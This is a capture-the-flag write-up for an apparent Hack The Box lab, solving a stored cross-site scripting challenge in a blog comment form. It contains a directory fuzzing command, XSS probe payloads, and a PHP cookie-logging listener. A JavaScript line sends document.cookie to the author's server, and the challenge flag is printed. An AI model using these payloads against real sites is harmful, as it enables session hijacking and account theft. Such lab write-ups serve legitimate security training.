## Challenge

What is the value of the 'flag' cookie? 

## Solution

I start by fuzzing the webpage, as it doesn't have a usual homepage at `index.php`:

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt:FUZZ -u http://10.129.12.174/FUZZ -t 100
```

This found me a directory at `assessment`, and when I visit that I see a blog, and I click on the post `Welcome to Security Blog`.

In the post I can post comments, where there is a form to fill, with comment, name, email, and website.

I fill the fields with the `"><script src=http://10.10.15.68:8000/fullname></script>` with the `fullname` changed based on the field name.

I start a php server with `php -S 0.0.0.0:8000 -t .`.

INFO: `10.10.15.68` was the IP address that I was using.

When I send the filled form, on my php server I received the `10.129.12.174:55626 [200]: GET /website` meaning that this filed is vulnerable.

On the directory where I started the server, I created the following files:

index.php
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

script.js
```js
new Image().src='http://10.10.15.68:8000/index.php?c='+document.cookie
```

Then, on the vulnerable field `website`, I put the following:

```html
"><script src=http://10.10.15.68:8000/script.js></script>
```

And then on my directory I check the `cookies.txt` where among the cookies is the flag: `Cookie:  flag=HTB{cr055_5173_5cr1p71n6_n1nj4}`.

